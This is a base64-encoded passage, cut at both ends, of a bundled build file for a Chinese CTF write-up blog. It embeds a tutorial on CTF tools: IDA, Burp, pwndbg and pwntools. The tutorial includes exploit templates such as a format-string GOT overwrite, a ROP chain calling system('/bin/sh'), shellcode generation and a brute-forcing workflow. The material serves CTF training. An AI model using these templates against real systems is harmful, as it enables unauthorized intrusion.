HU1Qjg5XHU1MTY4IC8gXHU1QkM2XHU3ODAxXHU1QjY2IC8gXHU0RThDXHU4RkRCXHU1MjM2XHU1MjI5XHU3NTI4PC9kZXNjcmlwdGlvbj5cXG5gICtcbiAgICAgICAgICBgICAgIDxsYW5ndWFnZT56aC1DTjwvbGFuZ3VhZ2U+XFxuYCArXG4gICAgICAgICAgYCAgICA8bGFzdEJ1aWxkRGF0ZT4ke25vd308L2xhc3RCdWlsZERhdGU+XFxuYCArXG4gICAgICAgICAgYCR7aXRlbXN9XFxuICA8L2NoYW5uZWw+XFxuPC9yc3M+XFxuYFxuICAgICAgKVxuXG4gICAgICAvLyBcdTI0NjQgXHU1MTY4XHU3QUQ5XHU2NDFDXHU3RDIyXHU3RDIyXHU1RjE1XG4gICAgICBjb25zdCBzZWFyY2hJbmRleCA9IGJ1aWxkU2VhcmNoSW5kZXgoKVxuICAgICAgd3JpdGVGaWxlU3luYyhhYnMoJ3NlYXJjaC1pbmRleC5qc29uJyksIEpTT04uc3RyaW5naWZ5KHNlYXJjaEluZGV4KSlcblxuICAgICAgLy8gXHUyNDY1IFx1NzdFNVx1OEJDNlx1NUU5M1x1NTE3M1x1N0NGQlx1NTZGRVx1NjU3MFx1NjM2RVx1RkYwOFx1ODI4Mlx1NzBCOSA9IFx1N0IxNFx1OEJCMFx1RkYwQ1x1OEZCOSA9IFx1N0FEOVx1NTE4NVx1NTNDQ1x1OTRGRVx1RkYwOVxuICAgICAgY29uc3QgZ3JhcGggPSBidWlsZEtiR3JhcGgoKVxuICAgICAgd3JpdGVGaWxlU3luYyhhYnMoJ2tiLWdyYXBoLmpzb24nKSwgSlNPTi5zdHJpbmdpZnkoZ3JhcGgpKVxuXG4gICAgICBjb25zb2xlLmxvZyhcbiAgICAgICAgYFtzZW8tc3RhdGljXSBcdTk4ODRcdTc1MUZcdTYyMTAgJHttYWRlfSBcdTY3NjFcdThERUZcdTc1MzEgXHUwMEI3IHNpdGVtYXAgJHtyb3V0ZXMubGVuZ3RofSBcdTY3NjEgXHUwMEI3IHJzcyAke09iamVjdC5rZXlzKGFydGljbGVzKS5sZW5ndGh9IFx1N0JDNyBcdTAwQjcgXHU2NDFDXHU3RDIyXHU3RDIyXHU1RjE1ICR7c2VhcmNoSW5kZXguaXRlbXMubGVuZ3RofSBcdTY3NjEgXHUwMEI3IFx1NTZGRVx1OEMzMSAke2dyYXBoLm5vZGVzLmxlbmd0aH0gXHU4MjgyXHU3MEI5LyR7Z3JhcGguZWRnZXMubGVuZ3RofSBcdThGQjlgXG4gICAgICApXG4gICAgfSxcbiAgfVxufVxuXG5leHBvcnQgZGVmYXVsdCBkZWZpbmVDb25maWcoe1xuICAvLyBcdTczQUZcdTU4ODNcdTYxMUZcdTc3RTVcdUZGMUFHaXRIdWIgUGFnZXMgXHU5NzAwXHU4OTgxXHU1QjUwXHU4REVGXHU1Rjg0XHVGRjBDVmVyY2VsIFx1NjgzOVx1OERFRlx1NUY4NFxuICBiYXNlOiBwcm9jZXNzLmVudi5WRVJDRUwgPyAnLycgOiAnL2N0Zi13cml0ZXVwLWJsb2cvJyxcbiAgcGx1Z2luczogW3JlYWN0KCksIHNlb1N0YXRpY1BsdWdpbigpXSxcbiAgc2VydmVyOiB7XG4gICAgaG9zdDogJzAuMC4wLjAnLFxuICAgIHBvcnQ6IDMwMDAsXG4gIH0sXG4gIGJ1aWxkOiB7XG4gICAgcm9sbHVwT3B0aW9uczoge1xuICAgICAgb3V0cHV0OiB7XG4gICAgICAgIG1hbnVhbENodW5rczoge1xuICAgICAgICAgICdmcmFtZXItbW90aW9uJzogWydmcmFtZXItbW90aW9uJ10sXG4gICAgICAgICAgdHNwYXJ0aWNsZXM6IFsnQHRzcGFydGljbGVzL3JlYWN0JywgJ0B0c3BhcnRpY2xlcy9zbGltJywgJ3RzcGFydGljbGVzJ10sXG4gICAgICAgICAgJ3JlYWN0LXZlbmRvcic6IFsncmVhY3QnLCAncmVhY3QtZG9tJywgJ3JlYWN0LXJvdXRlci1kb20nXSxcbiAgICAgICAgfSxcbiAgICAgIH0sXG4gICAgfSxcbiAgfSxcbiAgLy8gXHU2MzkyXHU5NjY0IHB1YmxpYy9nYXJnYW50dWEgXHU0RTJEXHU3Njg0IGltcG9ydCBtYXAgXHU2NTg3XHU0RUY2XHVGRjBDXHU5MDdGXHU1MTREIFZpdGUgXHU4QkVGXHU2MjZCXHU2M0NGXG4gIG9wdGltaXplRGVwczoge1xuICAgIGVudHJpZXM6IFsnaW5kZXguaHRtbCcsICdzcmMvKiovKi57anMsanN4fSddLFxuICB9LFxuICAvLyBcdTZENEJcdThCRDVcdUZGMDh2aXRlc3QgXHU3NkY0XHU2M0E1XHU4QkZCXHU1M0Q2IHZpdGUgXHU5MTREXHU3RjZFXHVGRjA5XG4gIHRlc3Q6IHtcbiAgICBlbnZpcm9ubWVudDogJ2pzZG9tJyxcbiAgICBpbmNsdWRlOiBbJ3Rlc3RzLyoqLyoudGVzdC57anMsanN4fSddLFxuICAgIHNldHVwRmlsZXM6IFsnLi90ZXN0cy9zZXR1cC5qcyddLFxuICB9LFxufSlcbiIsICJjb25zdCBfX3ZpdGVfaW5qZWN0ZWRfb3JpZ2luYWxfZGlybmFtZSA9IFwiQzpcXFxcVXNlcnNcXFxcaHdoXFxcXGJsb2dcXFxcZnJvbnRlbmRcXFxcc3JjXFxcXGRhdGFcIjtjb25zdCBfX3ZpdGVfaW5qZWN0ZWRfb3JpZ2luYWxfZmlsZW5hbWUgPSBcIkM6XFxcXFVzZXJzXFxcXGh3aFxcXFxibG9nXFxcXGZyb250ZW5kXFxcXHNyY1xcXFxkYXRhXFxcXGFydGljbGVzLmpzXCI7Y29uc3QgX192aXRlX2luamVjdGVkX29yaWdpbmFsX2ltcG9ydF9tZXRhX3VybCA9IFwiZmlsZTovLy9DOi9Vc2Vycy9od2gvYmxvZy9mcm9udGVuZC9zcmMvZGF0YS9hcnRpY2xlcy5qc1wiO2V4cG9ydCBjb25zdCBhcnRpY2xlcyA9IHtcclxuICB0b29sczoge1xyXG4gICAgdGl0bGU6ICdDVEYgXHU1REU1XHU1MTc3XHU0RjdGXHU3NTI4XHU2MzA3XHU1MzU3JyxcclxuICAgIHN1YnRpdGxlOiAnQ1RGIFRvb2xzIEd1aWRlJyxcclxuICAgIGNvbnRlbnQ6IGBcclxuQ1RGIFx1NkJENFx1OEQ1Qlx1NEUyRFx1NURFNVx1NTE3N1x1NzY4NFx1NEY3Rlx1NzUyOFx1ODFGM1x1NTE3M1x1OTFDRFx1ODk4MVx1MzAwMlx1OEZEOVx1OTFDQ1x1NjAzQlx1N0VEM1x1NEU4Nlx1NjIxMVx1NUUzOFx1NzUyOFx1NzY4NFx1NURFNVx1NTE3N1x1NTNDQVx1NTE3Nlx1NEY3Rlx1NzUyOFx1NjI4MFx1NURFN1x1MzAwMlxyXG5cclxuIyMgSURBIFBybyBcdTIwMTQgXHU5MDA2XHU1NDExXHU1MjA2XHU2NzkwXHU3OTVFXHU1NjY4XHJcblxyXG5JREEgUHJvIFx1NjYyRlx1NjcwMFx1NUYzQVx1NTkyN1x1NzY4NFx1OTc1OVx1NjAwMVx1NTNDRFx1NkM0N1x1N0YxNlx1NURFNVx1NTE3N1x1RkYwQ0NURiBcdTkwMDZcdTU0MTFcdTVGQzVcdTU5MDdcdTMwMDJcclxuXHJcbiMjIyBcdTU3RkFcdTc4NDBcdTY0Q0RcdTRGNUNcclxuXHJcbioqXHU2MjUzXHU1RjAwXHU2NTg3XHU0RUY2KipcclxuLSBcdTYyRDZcdTUxNjUgUEUvRUxGIFx1NjU4N1x1NEVGNlx1NTM3M1x1NTNFRlx1ODFFQVx1NTJBOFx1OEJDNlx1NTIyQlx1NjdCNlx1Njc4NFxyXG4tIFx1OTk5Nlx1NkIyMVx1NjI1M1x1NUYwMFx1OTAwOVx1NjJFOSBcIk5ld1wiXHVGRjBDXHU1NDBFXHU3RUVEXHU5MDA5IFwiTG9hZCBleGlzdGluZ1wiIFx1NEZERFx1NzU1OVx1NkNFOFx1OTFDQVxyXG5cclxuKipcdTVFMzhcdTc1MjhcdTVGRUJcdTYzNzdcdTk1MkUqKlxyXG5cclxuXFxgXFxgXFxgXHJcblRhYiAgICAgICAgICAjIFx1NTIwN1x1NjM2MiBHcmFwaCBWaWV3IC8gVGV4dCBWaWV3XHJcbkY1ICAgICAgICAgICAjIFx1NTNDRFx1N0YxNlx1OEJEMVx1NEUzQSBDIFx1NEYyQVx1NEVFM1x1NzgwMVx1RkYwOEhleC1SYXlzIFx1NjNEMlx1NEVGNlx1RkYwOVxyXG5TaGlmdCtGMTIgICAgIyBcdTYyNTNcdTVGMDBcdTVCNTdcdTdCMjZcdTRFMzJcdTg4NjhcdUZGMDhcdTYyN0VcdTY1NEZcdTYxMUZcdTVCNTdcdTdCMjZcdTRFMzJcdUZGMDlcclxuWCAgICAgICAgICAgICMgXHU2N0U1XHU3NzBCXHU0RUE0XHU1M0M5XHU1RjE1XHU3NTI4XHVGRjA4XHU2MjdFXHU1MUZEXHU2NTcwXHU4QzAzXHU3NTI4XHU0RjREXHU3RjZFXHVGRjA5XHJcblIgICAgICAgICAgICAjIFx1NUMwNlx1NjU3MFx1NjM2RVx1OEY2Q1x1NEUzQVx1NUI1N1x1N0IyNlx1NjYzRVx1NzkzQVxyXG5IICAgICAgICAgICAgIyBcdTUyMDdcdTYzNjJcdTY1NzBcdTYzNkVcdTY4M0NcdTVGMEZcdUZGMDhoZXgvZGVjL2Jpblx1RkYwOVxyXG5OICAgICAgICAgICAgIyBcdTkxQ0RcdTU0N0RcdTU0MERcdTUzRDhcdTkxQ0YvXHU1MUZEXHU2NTcwXHJcblNwYWNlICAgICAgICAjIFx1NTIwN1x1NjM2Mlx1NTNDRFx1NkM0N1x1N0YxNi9cdTUzNDFcdTUxNkRcdThGREJcdTUyMzZcdTg5QzZcdTU2RkVcclxuXFxgXFxgXFxgXHJcblxyXG4qKlx1NUI5RVx1NjIxOFx1NjI4MFx1NURFNyoqXHJcblxyXG5cdTYyN0UgbWFpbiBcdTUxRkRcdTY1NzBcdTc2ODRcdTRFMDlcdTc5Q0RcdTY1QjlcdTZDRDVcdUZGMUFcclxuMS4gKipcdTVCNTdcdTdCMjZcdTRFMzJcdTY3RTVcdTYyN0VcdTZDRDUqKjogU2hpZnQrRjEyIFx1NjQxQyBcImZsYWdcIlx1MzAwMVwicGFzc3dvcmRcIlx1MzAwMVwiaW5wdXRcIiBcdTdCNDlcclxuMi4gKipcdTk1N0ZcdTlBNzFcdTc2RjRcdTUxNjVcdTZDRDUqKjogXHU0RUNFXHU3QTBCXHU1RThGXHU1MTY1XHU1M0UzXHU0RTAwXHU2QjY1XHU2QjY1XHU4RERGXHVGRjBDXHU5MDAyXHU1NDA4XHU3QjgwXHU1MzU1XHU3QTBCXHU1RThGXHJcbjMuICoqQVBJIFx1NUYxNVx1NzUyOFx1NkNENSoqOiBcdTYyN0UgTWVzc2FnZUJveFx1MzAwMXNjYW5mXHUzMDAxc3RyY21wIFx1N0I0OVx1NTE3M1x1OTUyRSBBUElcclxuXHJcblxcYFxcYFxcYFxyXG4jIFx1NzkzQVx1NEY4Qlx1RkYxQUhlbGxvIENURiBcdTk4OThcdTc2RUVcclxuU2hpZnQrRjEyIFx1MjE5MiBcdTY0MUMgXCJwbGVhc2UgaW5wdXRcIiBcdTIxOTIgXHU1M0NDXHU1MUZCXHU4REYzXHU4RjZDIFx1MjE5MiBGNSBcdTc3MEJcdTRGMkFcdTRFRTNcdTc4MDFcclxuXHU3NzBCXHU1MjMwIHN0cmNweSBcdTU0OEMgc3RyY21wXHVGRjBDXHU1MjA2XHU2NzkwXHU5MDNCXHU4RjkxXHU1MzczXHU1M0VGXHJcblxcYFxcYFxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBCdXJwIFN1aXRlIFx1MjAxNCBXZWIgXHU2MjkzXHU1MzA1XHU2NTM5XHU1MzA1XHJcblxyXG5XZWIgXHU5ODk4XHU3NkVFXHU1RkM1XHU1OTA3XHVGRjBDXHU2MkU2XHU2MjJBXHU1NDhDXHU0RkVFXHU2NTM5IEhUVFAvSFRUUFMgXHU4QkY3XHU2QzQyXHUzMDAyXHJcblxyXG4jIyMgXHU2ODM4XHU1RkMzXHU1MjlGXHU4MEZEXHJcblxyXG4qKlByb3h5IFx1NkEyMVx1NTc1NyoqXHJcbi0gSW50ZXJjZXB0OiBcdTYyRTZcdTYyMkFcdThCRjdcdTZDNDJcdUZGMENcdTRGRUVcdTY1MzlcdTU0MEVcdTUxOERcdTUzRDFcdTkwMDFcclxuLSBIVFRQIGhpc3Rvcnk6IFx1NjdFNVx1NzcwQlx1NjI0MFx1NjcwOVx1OEJGN1x1NkM0Mlx1NTM4Nlx1NTNGMlxyXG5cclxuKipSZXBlYXRlciBcdTZBMjFcdTU3NTcqKlxyXG4tIFx1OTFDRFx1NjUzRVx1NTM1NVx1NEUyQVx1OEJGN1x1NkM0Mlx1RkYwQ1x1NjVCOVx1NEZCRlx1NkQ0Qlx1OEJENSBwYXlsb2FkXHJcbi0gXHU2NTJGXHU2MzAxXHU2MjRCXHU1MkE4XHU0RkVFXHU2NTM5XHU0RUZCXHU2MTBGXHU1QjU3XHU2QkI1XHJcblxyXG4qKkludHJ1ZGVyIFx1NkEyMVx1NTc1NyoqXHJcbi0gXHU2Mjc5XHU5MUNGXHU3MjA2XHU3ODM0XHVGRjFBXHU3NTI4XHU2MjM3XHU1NDBEXHUzMDAxXHU1QkM2XHU3ODAxXHUzMDAxXHU3NkVFXHU1RjU1XHU3QjQ5XHJcbi0gXHU2NTJGXHU2MzAxXHU1OTFBXHU3OUNEXHU2NTNCXHU1MUZCXHU2QTIxXHU1RjBGXHVGRjA4U25pcGVyL0JhdHRlcmluZyByYW0vUGl0Y2hmb3JrL0NsdXN0ZXIgYm9tYlx1RkYwOVxyXG5cclxuIyMjIFx1NUUzOFx1NzUyOFx1NjRDRFx1NEY1Q1xyXG5cclxuXFxgXFxgXFxgXHJcbiMgXHU2MkU2XHU2MjJBXHU1RTc2XHU0RkVFXHU2NTM5IENvb2tpZVxyXG5JbnRlcmNlcHQgT24gXHUyMTkyIFx1NkQ0Rlx1ODlDOFx1NTY2OFx1OEJCRlx1OTVFRVx1NzZFRVx1NjgwNyBcdTIxOTIgXHU1NzI4IEJ1cnAgXHU0RTJEXHU0RkVFXHU2NTM5IENvb2tpZTogdXNlcj1hZG1pbiBcdTIxOTIgRm9yd2FyZFxyXG5cclxuIyBcdTcyMDZcdTc4MzRcdTc2RUVcdTVGNTVcclxuVGFyZ2V0IFx1MjE5MiBcdTUzRjNcdTk1MkUgXCJFbmdhZ2VtZW50IHRvb2xzXCIgXHUyMTkyIERpc2NvdmVyIGNvbnRlbnRcclxuXHU2MjE2IEludHJ1ZGVyIFx1NTJBMFx1OEY3RFx1NUI1N1x1NTE3OFx1NzIwNlx1NzgzNCAvYXBpL0ZVWlpcclxuXFxgXFxgXFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIEdEQiAvIFB3bmRiZyBcdTIwMTQgUFdOIFx1OEMwM1x1OEJENVxyXG5cclxuTGludXggXHU0RTBCXHU0RThDXHU4RkRCXHU1MjM2XHU4QzAzXHU4QkQ1XHU3Njg0XHU2ODA3XHU1MUM2XHU1REU1XHU1MTc3XHUzMDAyXHJcblxyXG4jIyMgXHU1N0ZBXHU3ODQwXHU1NDdEXHU0RUU0XHJcblxyXG5cXGBcXGBcXGBcclxuZmlsZSAuL3B3biAgICAgICAjIFx1NTJBMFx1OEY3RFx1NzZFRVx1NjgwN1x1NjU4N1x1NEVGNlxyXG5ydW4gLyByICAgICAgICAgICMgXHU4RkQwXHU4ODRDXHU3QTBCXHU1RThGXHJcbmJyZWFrICptYWluICAgICAgIyBcdTU3MjggbWFpbiBcdTUxRkRcdTY1NzBcdTRFMEJcdTY1QURcdTcwQjlcclxuYnJlYWsgKjB4NDAxMDAwICAjIFx1NTcyOFx1NjMwN1x1NUI5QVx1NTczMFx1NTc0MFx1NEUwQlx1NjVBRFx1NzBCOVxyXG5jb250aW51ZSAvIGMgICAgICMgXHU3RUU3XHU3RUVEXHU4RkQwXHU4ODRDXHJcbm5leHQgLyBuICAgICAgICAgIyBcdTUzNTVcdTZCNjVcdTZCNjVcdThGQzdcclxuc3RlcCAvIHMgICAgICAgICAjIFx1NTM1NVx1NkI2NVx1NkI2NVx1NTE2NVxyXG5pbmZvIHJlZ2lzdGVycyAgICMgXHU2N0U1XHU3NzBCXHU1QkM0XHU1QjU4XHU1NjY4XHJcbngvMTBneCAkcnNwICAgICAgIyBcdTY3RTVcdTc3MEJcdTY4MDhcdTUxODVcdTVCQjlcdUZGMDgxMFx1NEUyQTY0XHU0RjREXHU1MDNDXHVGRjA5XHJcbnZtbWFwICAgICAgICAgICAgIyBcdTY3RTVcdTc3MEJcdTUxODVcdTVCNThcdTY2MjBcdTVDMDRcdUZGMDhwd25kYmdcdUZGMDlcclxuY2hlY2tzZWMgICAgICAgICAjIFx1NjdFNVx1NzcwQlx1NEZERFx1NjJBNFx1NjczQVx1NTIzNlx1RkYwOHB3bmRiZ1x1RkYwOVxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIyBQd25kYmcgXHU1ODlFXHU1RjNBXHJcblxyXG5cXGBcXGBcXGBcclxuIyBcdTVCODlcdTg4QzVcclxucGlwIGluc3RhbGwgcHdudG9vbHNcclxuZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9wd25kYmcvcHduZGJnXHJcbmNkIHB3bmRiZyAmJiAuL3NldHVwLnNoXHJcblxyXG4jIFx1NUUzOFx1NzUyOFx1NTI5Rlx1ODBGRFxyXG5jb250ZXh0ICAgICAgICAgICMgXHU4MUVBXHU1MkE4XHU2NjNFXHU3OTNBXHU1QkM0XHU1QjU4XHU1NjY4XHUzMDAxXHU2ODA4XHUzMDAxXHU0RUUzXHU3ODAxXHJcbmhlYXAgICAgICAgICAgICAgIyBcdTY3RTVcdTc3MEJcdTU4MDZcdTdFRDNcdTY3ODRcclxuY3ljbGljIDEwMCAgICAgICAjIFx1NzUxRlx1NjIxMCBEZSBCcnVpam4gXHU1RThGXHU1MjE3XHU2MjdFXHU1MDRGXHU3OUZCXHJcblxcYFxcYFxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBQeXRob24gKyBQd250b29scyBcdTIwMTQgUFdOIFx1ODFFQVx1NTJBOFx1NTMxNlxyXG5cclxuUHdudG9vbHMgXHU2NjJGIENURiBQV04gXHU2NUI5XHU1NDExXHU3Njg0IFB5dGhvbiBcdTVFOTNcdUZGMENcdTY3ODFcdTU5MjdcdTdCODBcdTUzMTYgZXhwbG9pdCBcdTdGMTZcdTUxOTlcdTMwMDJcclxuXHJcbiMjIyBcdTU3RkFcdTc4NDBcdTc1MjhcdTZDRDVcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5mcm9tIHB3biBpbXBvcnQgKlxyXG5cclxuIyBcdThGREVcdTYzQTVcdThGRENcdTdBMEJcdTY3MERcdTUyQTFcclxucCA9IHJlbW90ZSgndGFyZ2V0LmNvbScsIDEzMzcpXHJcblxyXG4jIFx1NjcyQ1x1NTczMFx1OEMwM1x1OEJENVxyXG5wID0gcHJvY2VzcygnLi9wd24nKVxyXG5cclxuIyBcdTk2NDRcdTUyQTBcdThDMDNcdThCRDVcdTU2NjhcclxuZ2RiLmF0dGFjaChwKVxyXG5cclxuIyBcdTYzQTVcdTY1MzYvXHU1M0QxXHU5MDAxXHU2NTcwXHU2MzZFXHJcbnAucmVjdnVudGlsKGInaW5wdXQ6JylcclxucC5zZW5kbGluZShiJ3BheWxvYWQnKVxyXG5cclxuIyBcdTY4M0NcdTVGMEZcdTUzMTZcdTVCNTdcdTdCMjZcdTRFMzJcdTUyMjlcdTc1MjhcclxucC5zZW5kbGluZShmbXRzdHJfcGF5bG9hZCg2LCB7ZWxmLmdvdFsncHJpbnRmJ106IGVsZi5zeW1bJ3N5c3RlbSddfSkpXHJcblxyXG4jIFx1ODNCN1x1NTNENiBzaGVsbCBcdTU0MEVcdTRFQTRcdTRFOTJcclxucC5pbnRlcmFjdGl2ZSgpXHJcblxcYFxcYFxcYFxyXG5cclxuIyMjIFx1NUUzOFx1NzUyOFx1NTI5Rlx1ODBGRFxyXG5cclxuXFxgXFxgXFxgcHl0aG9uXHJcbmNvbnRleHQuYXJjaCA9ICdhbWQ2NCcgICAgICAjIFx1OEJCRVx1N0Y2RVx1NjdCNlx1Njc4NFxyXG5jb250ZXh0LmxvZ19sZXZlbCA9ICdkZWJ1ZycgIyBcdTVGMDBcdTU0MkZcdThDMDNcdThCRDVcdThGOTNcdTUxRkFcclxuXHJcbiMgRUxGIFx1NjU4N1x1NEVGNlx1NjRDRFx1NEY1Q1xyXG5lbGYgPSBFTEYoJy4vcHduJylcclxucHJpbnQoaGV4KGVsZi5zeW1bJ21haW4nXSkpICAgICAgIyBcdTgzQjdcdTUzRDZcdTUxRkRcdTY1NzBcdTU3MzBcdTU3NDBcclxucHJpbnQoaGV4KGVsZi5nb3RbJ3B1dHMnXSkpICAgICAgIyBcdTgzQjdcdTUzRDYgR09UIFx1ODg2OFx1NTczMFx1NTc0MFxyXG5cclxuIyBST1AgXHU1REU1XHU1MTc3XHJcbnJvcCA9IFJPUChlbGYpXHJcbnJvcC5jYWxsKGVsZi5zeW1bJ3N5c3RlbSddLCBbbmV4dChlbGYuc2VhcmNoKGInL2Jpbi9zaCcpKV0pXHJcbnBheWxvYWQgPSByb3AuY2hhaW4oKVxyXG5cclxuIyBTaGVsbGNvZGVcclxuY29udGV4dC5hcmNoID0gJ2FtZDY0J1xyXG5zYyA9IGFzbShzaGVsbGNyYWZ0LnNoKCkpXHJcblxcYFxcYFxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBcdTUxNzZcdTRFRDZcdTVFMzhcdTc1MjhcdTVERTVcdTUxNzdcclxuXHJcbnwgXHU1REU1XHU1MTc3IHwgXHU3NTI4XHU5MDE0IHwgXHU1MTc4XHU1NzhCXHU1NzNBXHU2NjZGIHxcclxufC0tLS0tLXwtLS0tLS18LS0tLS0tLS0tLXxcclxufCAqKmNoZWNrc2VjKiogfCBcdTY4QzBcdTY3RTVcdTRFOENcdThGREJcdTUyMzZcdTRGRERcdTYyQTQgfCBcdTY3RTVcdTc3MEIgTlgvUElFL0NhbmFyeS9SRUxSTyB8XHJcbnwgKipST1BnYWRnZXQqKiB8IFx1NjdFNVx1NjI3RSBST1AgXHU5NEZFIHwgXHU2Nzg0XHU5MDIwIFJPUCBwYXlsb2FkIHxcclxufCAqKm9uZV9nYWRnZXQqKiB8IFx1NjI3RSBleGVjdmUgXHU1NzMwXHU1NzQwIHwgbGliYyBcdTUyMjlcdTc1MjggfFxyXG58ICoqc3RyaW5ncyoqIHwgXHU2N0U1XHU3NzBCXHU1QjU3XHU3QjI2XHU0RTMyIHwgXHU1RkVCXHU5MDFGXHU2MjdFIGZsYWcgXHU2ODNDXHU1RjBGIHxcclxufCAqKmJpbndhbGsqKiB8IFx1NjU4N1x1NEVGNlx1NTIwNlx1Njc5MCB8IFx1NjNEMFx1NTNENlx1OTY5MFx1ODVDRlx1NjU4N1x1NEVGNiB8XHJcbnwgKip6c3RlZyoqIHwgTFNCIFx1OTY5MFx1NTE5OSB8IFBORyBcdTU2RkVcdTcyNDdcdTk2OTBcdTUxOTkgfFxyXG58ICoqc3RlZ2hpZGUqKiB8IFx1OTY5MFx1NTE5OVx1NjNEMFx1NTNENiB8IFx1NUUyNlx1NUJDNlx1NzgwMVx1NzY4NFx1NTZGRVx1NzI0N1x1OTY5MFx1NTE5OSB8XHJcbnwgKipDeWJlckNoZWYqKiB8IFx1NTcyOFx1N0VCRlx1N0YxNlx1NzgwMVx1OEY2Q1x1NjM2MiB8IEJhc2U2NC9IZXgvVVJMIFx1N0YxNlx1NzgwMSB8XHJcbnwgKipIYXNoY2F0KiogfCBcdTVCQzZcdTc4MDFcdTc4MzRcdTg5RTMgfCBcdTc4MzRcdTg5RTNcdTU0QzhcdTVFMEMgfFxyXG58ICoqSm9obioqIHwgXHU1QkM2XHU3ODAxXHU3ODM0XHU4OUUzIHwgemlwL3BkZiBcdTY1ODdcdTRFRjZcdTc4MzRcdTg5RTMgfFxyXG5cclxuLS0tXHJcblxyXG4jIyBcdTkwMUZcdTY3RTVcdTg4NjhcclxuXHJcbiMjIyBcdTVGRUJcdTkwMUZcdTU0MkZcdTUyQThcdTU0N0RcdTRFRTRcclxuXHJcblxcYFxcYFxcYGJhc2hcclxuIyBJREFcclxuaWRhNjQgLi9iaW5hcnlcclxuXHJcbiMgR0RCXHJcbnB3bmRiZyAuL2JpbmFyeVxyXG5cclxuIyBCdXJwXHJcbmphdmEgLWphciBidXJwc3VpdGVfY29tbXVuaXR5LmphclxyXG5cclxuIyBQeXRob24gZXhwbG9pdFxyXG5weXRob24zIGV4cC5weVxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIyBcdTVFMzhcdTc1MjggUGF5bG9hZCBcdTZBMjFcdTY3N0ZcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG4jIFx1NTdGQVx1Nzg0MFx1OEZERVx1NjNBNVx1NkEyMVx1Njc3RlxyXG5mcm9tIHB3biBpbXBvcnQgKlxyXG5jb250ZXh0LmxvZ19sZXZlbCA9ICdkZWJ1ZydcclxucCA9IHJlbW90ZSgnaG9zdCcsIHBvcnQpXHJcbiMgcCA9IHByb2Nlc3MoJy4vcHduJylcclxuIyBnZGIuYXR0YWNoKHApXHJcblxyXG5wLnJlY3Z1bnRpbChiJzonKVxyXG5wLnNlbmRsaW5lKGIncGF5bG9hZCcpXHJcbnByaW50KHAucmVjdmxpbmUoKSlcclxucC5pbnRlcmFjdGl2ZSgpXHJcblxcYFxcYFxcYFxyXG5cclxuLS0tXHJcblxyXG4qKlx1NUVGQVx1OEJBRSoqXHVGRjFBXHU1REU1XHU1MTc3XHU1M0VBXHU2NjJGXHU2MjRCXHU2QkI1XHVGRjBDXHU3NDA2XHU4OUUzXHU1MzlGXHU3NDA2XHU2MjREXHU2NjJGXHU2ODM4XHU1RkMzXHUzMDAyXHU1OTFBXHU1MjM3XHU5ODk4XHVGRjBDXHU1OTFBXHU1MkE4XHU2MjRCXHVGRjBDXHU1REU1XHU1MTc3XHU0RjFBXHU4RDhBXHU2NzY1XHU4RDhBXHU5ODdBXHU2MjRCXHUzMDAyXHJcbmBcclxuICB9LFxyXG4gIGluZm9sZWFrOiB7XHJcbiAgICB0aXRsZTogJ1x1NEZFMVx1NjA2Rlx1NjUzNlx1OTZDNlx1NEUwRVx1NkNDNFx1OTczMicsXHJcbiAgICBzdWJ0aXRsZTogJ0luZm9ybWF0aW9uIEdhdGhlcmluZyAmIExlYWthZ2UnLFxyXG4gICAgY29udGVudDogYFxyXG5cdTUwNUFcdTRGRTFcdTYwNkZcdTY1MzZcdTk2QzZcdThGRDlcdTdDN0JcdTk4OThcdUZGMENcdTYyMTFcdTY3MDBcdTU5MjdcdTc2ODRcdTYxMUZcdTUzRDdcdTVDMzFcdTY2MkYqKlx1NTIyQlx1NjUzRVx1OEZDN1x1NTQwRVx1NTNGMFx1NzY4NFx1NkJDRlx1NEUwMFx1Njc2MVx1N0VCRlx1N0QyMioqXHUzMDAyXHU1Rjg4XHU1OTFBIGZsYWcgXHU1MTc2XHU1QjlFXHU1QzMxXHU4NUNGXHU1NzI4XHU3NzNDXHU3NkFFXHU1RTk1XHU0RTBCXHVGRjBDXHU1M0VBXHU2NjJGXHU2MjExXHU0RUVDXHU2Q0ExXHU2Q0U4XHU2MTBGXHU1MjMwXHUzMDAyXHJcblxyXG4jIyBIVE1MIFx1NkNFOFx1OTFDQVx1NEUwRVx1NTI0RFx1N0FFRlx1NkNDNFx1OTczMlxyXG5cclxuXHU2NzAwXHU2NUU5XHU3Njg0XHU5ODk4XHU3NkVFXHU1QzMxXHU2NzA5XHU5NjkwXHU4NUNGXHU1NzI4IEhUTUwgXHU2Q0U4XHU5MUNBXHU5MUNDXHU3Njg0IGJhc2U2NCBcdTVCNTdcdTdCMjZcdTRFMzJcdTMwMDJcdTYyMTFcdTRFNjBcdTYwRUYgQ3RybCtVIFx1NzcwQlx1NkU5MFx1NzgwMVx1RkYwQ1x1N0VEM1x1Njc5Q1x1NTcyOFx1NkNFOFx1OTFDQVx1NEUyRFx1NTNEMVx1NzNCMFx1NEUwMFx1NEUzMlx1NTNFRlx1NzU5MVx1NUI1N1x1N0IyNlx1NEUzMlx1RkYwQ1x1ODlFM1x1NzgwMVx1NzZGNFx1NjNBNVx1NTFGQSBmbGFnXHUzMDAyXHJcblxyXG5cXGBcXGBcXGBiYXNoXHJcbmVjaG8gJ1pteGhaM3N4TTJGaC4uLicgfCBiYXNlNjQgLWRcclxuIyBmbGFnezEzYWFiMWIyLTZmZmMtNDBiYi1iOTM2LTZiZjAyNDU2YWZjYX1cclxuXFxgXFxgXFxgXHJcblxyXG5KU0Z1Y2sgXHU2NjJGXHU1M0U2XHU0RTAwXHU0RTJBXHU1MjREXHU3QUVGXHU2REY3XHU2REM2XHU3Njg0XHU5MUNEXHU3MDdFXHU1MzNBXHUzMDAyXHU5ODc1XHU5NzYyXHU0RTBBXHU3NzBCXHU4RDc3XHU2NzY1XHU2NjJGXHU0RTAwXHU1ODA2XHU0RTcxXHU3ODAxIFxcYFtcXGBdIFxcYChcXGApIFxcYCFcXGAgXFxgK1xcYCwgXHU1MTc2XHU1QjlFXHU2NjJGIEphdmFTY3JpcHQgXHU4ODY4XHU4RkJFXHU1RjBGXHUzMDAyXHU2NzAwXHU3QjgwXHU1